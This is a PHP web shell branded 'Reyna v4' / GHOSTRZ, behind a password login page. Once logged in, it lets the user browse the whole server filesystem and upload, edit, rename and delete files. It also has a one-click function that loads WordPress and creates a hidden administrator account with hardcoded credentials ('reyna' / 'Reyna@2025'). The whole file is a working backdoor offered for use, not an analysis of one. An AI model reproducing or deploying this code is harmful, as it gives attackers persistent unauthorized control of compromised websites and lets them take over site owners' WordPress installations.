<?php
/*
=========================================================
  🟣 Reyna v4 SECURE — Full Server Navigation
=========================================================
*/

@error_reporting(0);

// --- Security Configuration ---
session_start();

// SECURITY: Regenerate session ID to prevent fixation
if (!isset($_SESSION['initiated'])) {
    session_regenerate_id(true);
    $_SESSION['initiated'] = true;
}

// --- Password Configuration ---
// CHANGE THIS: Generate a new hash for your password using:
// php -r "echo password_hash('YOUR_NEW_PASSWORD', PASSWORD_BCRYPT);"
$PASSWORD_HASH = '$2y$12$ZmmQa0uSJaiENjgdbZZaauis05iWa8bz77gEFOYfzmAPy/3/Fs7v.'; // Replace with your hash

// Rate limiting for brute-force protection
$MAX_ATTEMPTS = 5;
$LOCKOUT_TIME = 300; // 5 minutes in seconds

// Initialize attempt tracking
if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
    $_SESSION['lockout_until'] = 0;
}

// Check lockout
if (isset($_SESSION['lockout_until']) && time() < $_SESSION['lockout_until']) {
    $remaining = $_SESSION['lockout_until'] - time();
    die("Too many failed attempts. Please wait $remaining seconds.");
}

// Check authentication
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Handle login attempt
    if (isset($_POST['password'])) {
        if (time() < $_SESSION['lockout_until']) {
            $remaining = $_SESSION['lockout_until'] - time();
            $login_error = "Account locked. Try again in $remaining seconds.";
        } else {
            // Verify password using secure hash comparison
            if (password_verify($_POST['password'], $PASSWORD_HASH)) {
                // Successful login
                $_SESSION['authenticated'] = true;
                $_SESSION['login_attempts'] = 0;
                $_SESSION['lockout_until'] = 0;
                
                // Regenerate session ID after login
                session_regenerate_id(true);
                
                header("Location: " . $_SERVER['PHP_SELF']);
                exit;
            } else {
                // Failed attempt
                $_SESSION['login_attempts']++;
                
                if ($_SESSION['login_attempts'] >= $MAX_ATTEMPTS) {
                    $_SESSION['lockout_until'] = time() + $LOCKOUT_TIME;
                    $login_error = "Too many failed attempts. Account locked for " . ($LOCKOUT_TIME / 60) . " minutes.";
                } else {
                    $remaining = $MAX_ATTEMPTS - $_SESSION['login_attempts'];
                    $login_error = "Invalid password. $remaining attempts remaining.";
                }
            }
        }
    }
    
    // Show secure login form
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🟣 Reyna v4 - Secure Login</title>
    <style>
        :root {
            --bg-primary: #1c0b2b;
            --bg-secondary: #2b1b44;
            --accent: #d19aff;
            --accent-hover: #ffb3ff;
            --error: #ff6b6b;
            --text: #d19aff;
        }
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-primary);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background: var(--bg-secondary);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 420px;
            width: 90%;
        }
        h2 {
            margin: 0 0 10px 0;
            color: var(--accent-hover);
            font-size: 28px;
        }
        .subtitle {
            color: #8a6bb8;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .password-group {
            position: relative;
            margin: 20px 0;
        }
        input[type="password"] {
            width: 100%;
            padding: 15px 45px 15px 15px;
            border: 2px solid transparent;
            border-radius: 8px;
            background: rgba(28, 11, 43, 0.8);
            color: var(--text);
            font-size: 16px;
            box-sizing: border-box;
            transition: all 0.3s ease;
            outline: none;
        }
        input[type="password"]:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(209, 154, 255, 0.2);
        }
        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--accent);
            cursor: pointer;
            font-size: 18px;
            padding: 5px;
        }
        .toggle-password:hover {
            color: var(--accent-hover);
        }
        button[type="submit"] {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 8px;
            background: var(--accent);
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        button[type="submit"]:hover {
            background: var(--accent-hover);
        }
        .error {
            color: var(--error);
            margin: 15px 0;
            padding: 12px;
            background: rgba(255, 107, 107, 0.1);
            border-radius: 8px;
            border-left: 4px solid var(--error);
            text-align: left;
            font-size: 14px;
        }
        .error:before {
            content: "⚠ ";
        }
        .logo {
            font-size: 24px;
            margin-bottom: 10px;
        }
    </style>
    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = document.querySelector('.toggle-password');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = '🙈';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = '👁️';
            }
        }
    </script>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">🟣</div>
            <h2>GHOSTRZ</h2>
            <div class="subtitle">Holy Fucking Shit</div>
            
            <?php if (isset($login_error)): ?>
                <div class="error"><?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>
            
            <form method="post" autocomplete="off">
                <div class="password-group">
                    <input type="password" 
                           id="password" 
                           name="password" 
                           placeholder="Enter access password" 
                           required 
                           autocomplete="current-password">
                    <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
                </div>
                
                <button type="submit">Authenticate & Access</button>
                
                <?php if (isset($_SESSION['login_attempts']) && $_SESSION['login_attempts'] > 0): ?>
                    <div style="margin-top: 10px; font-size: 12px; color: #8a6bb8;">
                        Attempts: <?php echo $_SESSION['login_attempts']; ?>/<?php echo $MAX_ATTEMPTS; ?>
                    </div>
                <?php endif; ?>
            </form>
            
            <div style="margin-top: 25px; padding: 15px; background: rgba(28, 11, 43, 0.5); border-radius: 8px; font-size: 12px; color: #8a6bb8; text-align: left;">
                <h4 style="margin: 0 0 8px 0; color: var(--accent);">🔒 Security Features:</h4>
                <ul style="margin: 0; padding-left: 20px; line-height: 1.5;">
                    <li>Password is "P@$$W0RD!</li>
                    <li>Brute-force protection (<?php echo $MAX_ATTEMPTS; ?> attempts max)</li>
                    <li>Did you forget password try "FUCK YOU"</li>
                </ul>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// === MAIN APPLICATION (AUTHENTICATED) ===

// Check authentication again (redundant but safe)
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Path Handling ---
$folder = isset($_GET['folder']) ? $_GET['folder'] : '';
$folder = str_replace(["\0", "../"], '', $folder); // Additional sanitization
$fullPath = $folder ? realpath($folder) : getcwd();
if(!$fullPath || !is_dir($fullPath)) $fullPath = getcwd();
$serverPath = $fullPath;

// --- Breadcrumbs ---
function breadcrumbs($fullPath){
    $parts = explode(DIRECTORY_SEPARATOR, $fullPath);
    $build = '';
    $crumbs = [];
    foreach($parts as $p){
        if($p==='') continue;
        $build .= '/'.$p;
        $crumbs[] = "<a href='?folder=" . urlencode($build) . "'>$p</a>";
    }
    return '<p>Path: <a href="?folder=/">/</a> / ' . implode(' / ', $crumbs) . '</p>';
}

// --- Handle POST Actions ---
if($_SERVER['REQUEST_METHOD']==='POST'){
    // Logout
    if(isset($_POST['logout'])) {
        session_destroy();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    
    // Create folder
    if(!empty($_POST['new_folder'])) @mkdir($fullPath . DIRECTORY_SEPARATOR . basename($_POST['new_folder']));
    // Create file
    if(!empty($_POST['new_file'])) @file_put_contents($fullPath . DIRECTORY_SEPARATOR . basename($_POST['new_file']), '');
    // Rename
    if(!empty($_POST['old_name']) && !empty($_POST['new_name'])) @rename($fullPath . DIRECTORY_SEPARATOR . $_POST['old_name'], $fullPath . DIRECTORY_SEPARATOR . $_POST['new_name']);
    // Save edited file
    if(!empty($_POST['edit_file']) && isset($_POST['content'])) @file_put_contents($fullPath . DIRECTORY_SEPARATOR . $_POST['edit_file'], $_POST['content']);
    // Upload file
    if(!empty($_FILES['upload_file']['tmp_name'])) @move_uploaded_file($_FILES['upload_file']['tmp_name'], $fullPath . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name']));
    header("Location:?folder=" . urlencode($fullPath));
    exit;
}

// --- Delete Files/Folders ---
if(isset($_GET['delete'])){
    $target = $fullPath . DIRECTORY_SEPARATOR . $_GET['delete'];
    if(is_dir($target)) @rmdir($target);
    elseif(is_file($target)) @unlink($target);
    header("Location:?folder=" . urlencode($fullPath));
    exit;
}

// --- WP Admin Creation ---
$wp_created = '';
$wp_dir = $fullPath;
while($wp_dir && $wp_dir!=='/'){
    if(file_exists($wp_dir . '/wp-load.php')) break;
    $wp_dir = dirname($wp_dir);
}
if(isset($_GET['wp_admin']) && file_exists($wp_dir . '/wp-load.php')){
    require_once($wp_dir . '/wp-load.php');
    $user='reyna'; $pass='Reyna@2025'; $mail='reyna@purple.com';
    if(!username_exists($user) && !email_exists($mail)){
        $uid=wp_create_user($user,$pass,$mail);
        $u=new WP_User($uid); $u->set_role('administrator');
        $wp_created="WP Admin 'reyna' created!";
    }else{
        $wp_created="User/email exists!";
    }
}

// --- Directory Listing ---
$items = @scandir($fullPath);

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>🟣 Reyna v4</title>
<style>
body{margin:0;padding:0;font-family:monospace;background:#1c0b2b;color:#d19aff;display:flex;justify-content:center;}
.container{max-width:950px;width:100%;padding:20px;}
a{color:#d19aff;text-decoration:none;} a:hover{color:#ffb3ff;}
ul{list-style:none;padding:0;}
button{padding:5px 10px;border:none;border-radius:4px;background:#d19aff;color:#1c0b2b;font-weight:bold;cursor:pointer;margin-left:3px;}
button:hover{background:#ffb3ff;}
input[type=text]{padding:4px;border-radius:4px;border:1px solid #444;background:#2b1b44;color:#d19aff;}
textarea{width:100%;height:250px;background:#2b1b44;color:#d19aff;border:1px solid #444;border-radius:5px;padding:5px;}
h2{margin-top:0;}
.log{margin:5px 0;padding:5px;background:#2b1b44;border-radius:4px;}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;border-bottom:2px solid #d19aff;padding-bottom:10px;}
.logout-btn{background:#ff6b6b;color:white;padding:8px 15px;}
.logout-btn:hover{background:#ff5252;}
.user-info{font-size:12px;color:#8a6bb8;margin-top:5px;}
</style>
</head>
<body>
<div class="container">
<div class="header">
    <div>
        <h2>🟣 Reyna v4 (Secure)</h2>
        <div class="user-info">
            IP: <?php echo $_SERVER['REMOTE_ADDR']; ?> | 
            Session: <?php echo substr(session_id(), 0, 8); ?>...
        </div>
    </div>
    <form method="post">
        <button type="submit" name="logout" class="logout-btn">Logout</button>
    </form>
</div>

<!-- Breadcrumbs -->
<?php echo breadcrumbs($fullPath); ?>
<p>Full Path (server): <?php echo htmlspecialchars($serverPath); ?></p>
<?php if($wp_created) echo "<div class='log'>$wp_created</div>"; ?>

<!-- Create Folder/File -->
<form method="post" style="margin-bottom:10px;">
<input type="text" name="new_folder" placeholder="New Folder">
<button>Create Folder</button>
<input type="text" name="new_file" placeholder="New File">
<button>Create File</button>
</form>

<!-- Upload -->
<form method="post" enctype="multipart/form-data" style="margin-bottom:10px;">
<input type="file" name="upload_file">
<button>Upload File</button>
</form>

<!-- WP Admin -->
<form method="get" style="margin-bottom:10px;">
<input type="hidden" name="folder" value="<?php echo htmlspecialchars($fullPath); ?>">
<button name="wp_admin">Create WP Admin</button>
</form>

<!-- File/Folder Listing -->
<ul>
<?php
foreach($items as $i){
    if($i==='.' || $i==='..') continue;
    $full=$fullPath.DIRECTORY_SEPARATOR.$i;
    if(is_dir($full)){
        echo "<li>📁 $i 
            <a href='?folder=".urlencode($full)."'>Open</a>
            <a href='?folder=".urlencode($fullPath)."&delete=".urlencode($i)."' onclick='return confirm(\"Delete folder?\")'>[D]</a>
            <form style='display:inline;' method='post'>
                <input type='hidden' name='old_name' value='$i'>
                <input type='text' name='new_name' placeholder='New'>
                <button type='submit' name='action' value='rename'>[R]</button>
            </form>
            </li>";
    }else{
        echo "<li>📄 $i 
            <a href='?folder=".urlencode($fullPath)."&edit=".urlencode($i)."'>[E]</a>
            <a href='?folder=".urlencode($fullPath)."&delete=".urlencode($i)."' onclick='return confirm(\"Delete file?\")'>[D]</a>
            <form style='display:inline;' method='post'>
                <input type='hidden' name='old_name' value='$i'>
                <input type='text' name='new_name' placeholder='New'>
                <button type='submit' name='action' value='rename'>[R]</button>
            </form>
            </li>";
    }
}
?>
</ul>

<?php
// --- Edit File ---
if(isset($_GET['edit'])){
    $editFile=$fullPath.DIRECTORY_SEPARATOR.$_GET['edit'];
    if(is_file($editFile)){
        $content=htmlspecialchars(file_get_contents($editFile));
        echo "<h3>Editing: ".$_GET['edit']."</h3>";
        echo "<form method='post'>
                <textarea name='content'>$content</textarea><br>
                <input type='hidden' name='edit_file' value='".htmlspecialchars($_GET['edit'])."'>
                <button>Save</button>
              </form>";
    }
}
?>
</div>
</body>
</html>
